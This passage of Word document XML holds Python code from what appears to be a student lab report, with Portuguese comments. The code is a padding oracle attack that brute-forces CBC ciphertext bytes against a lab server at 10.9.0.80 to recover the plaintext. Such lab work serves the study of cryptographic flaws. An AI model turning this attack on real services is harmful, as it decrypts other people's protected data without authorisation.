        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    def _recv(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="066637AC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        return self.s.recv(4096).decode().strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A726C59" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32B341EA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    def _send(self, hexstr: bytes):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F46E99" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.s.send(hexstr + b'\n')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3943AD16" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74540619" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __del__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="567AD681" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.s.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41840295" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0063E14E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>def decryptBlock(K, current_padding, CC1, D2, C2):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12C71247" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    if K &gt; 16:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A14F652" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        return CC1, D2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="113AAFC5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1375C78D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i in range(256):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28751B6E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        CC1[16 - K] = i</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FAA0F12" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        status = oracle.decrypt(IV + CC1 + C2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A1103A7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        CC1_backup = CC1.copy()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C5D689" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        D2_backup = D2.copy()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65C440CD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34F6DC0E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        if status == "Valid":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D64C7EB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">            aux = hex(i)[2:].zfill(2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E56837A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">            D2[16 - K] = int(xor(bytearray.fromhex(current_padding), </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77FE9198" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">                                 bytearray.fromhex(aux)).hex(), base=16)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C246FD9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">            current_padding = hex(int(current_padding, base=16) + 1)[2:].zfill(2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE3CCF3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A3A3627" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">            for x in range(1, K + 1):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="563C78FE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">                auxD2 = hex(D2[16 - x])[2:].zfill(2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68FA87A8" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">                CC1[16 - x] = int(xor(bytearray.fromhex(current_padding), </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E331AA2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">                                     bytearray.fromhex(auxD2)).hex(), base=16)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3991BA8E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26AE9D40" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>print(f"Encontrado: byte = 0x{i:02x}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D3548E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>print(f"CC1: {CC1.hex()}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D5F76D2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="425E28B6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">            CC1, D2 = decryptBlock(K + 1, current_padding, CC1, D2, C2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="314CA077" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">            if CC1 != [] and D2 != []:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B4C09B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">                return CC1, D2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="284DF02C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5103971C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        CC1 = CC1_backup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C8DFD2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        D2 = D2_backup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="623F3C2D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EF46FBA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    return [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726F0331" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27DA59BA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB0EFD6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    oracle = PaddingOracle('10.9.0.80', 6000)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64EDD894" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    BLOCK_SIZE = 16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139A9F14" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DD578AA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    iv_and_ctext = bytearray(oracle.ctext)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7182E6A6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    num_blocks = int((len(iv_and_ctext) - BLOCK_SIZE) / BLOCK_SIZE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45D766CA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    IV = iv_and_ctext[0:BLOCK_SIZE]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="738F3037" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5739B034" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>mensagem_completa = ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B29AF67" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    bloco_atual = num_blocks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="693AED90" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14B8A3C7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    # Processar blocos do último para o primeiro (exceto o primeiro)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A6FC371" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>for idx in range(num_blocks - 1):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CA977BA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        inicio_bloco_anterior = (num_blocks - idx - 2) * BLOCK_SIZE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6304D2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        inicio_bloco_atual = (num_blocks - idx - 1) * BLOCK_SIZE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DBCB5A5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B914E1C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00842992" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>bloco_anterior = iv_and_ctext[inicio_bloco_anterior:inicio_bloco_anterior + BLOCK_SIZE]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="706E79D6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>bloco_atual = iv_and_ctext[inicio_bloco_atual:inicio_bloco_atual + BLOCK_SIZE]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5944F5A3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45904176" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"\n{'='*60}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A2C1E23" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"Processando Bloco {bloco_atual}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="198D0F7E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"Bloco Anterior: {bloco_anterior.hex()}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53980207" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"Bloco Atual: {bloco_atual.hex()}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0992BBA9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"{'='*60}\n")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D35F233" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79996404" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">        # Inicializar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C9EF753" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>D = bytearray(16)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4982E705" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        CC = bytearray(16)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE589AD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29DF8A0A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        # Executar ataque</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FBF7373" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        current_padding = "01"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EBD1077" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        CC, D = decryptBlock(1, current_padding, CC, D, bloco_atual)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662D91A6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D398736" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t># Recuperar plaintext</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230510C4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">        P = xor(bloco_anterior, D)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1460E348" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
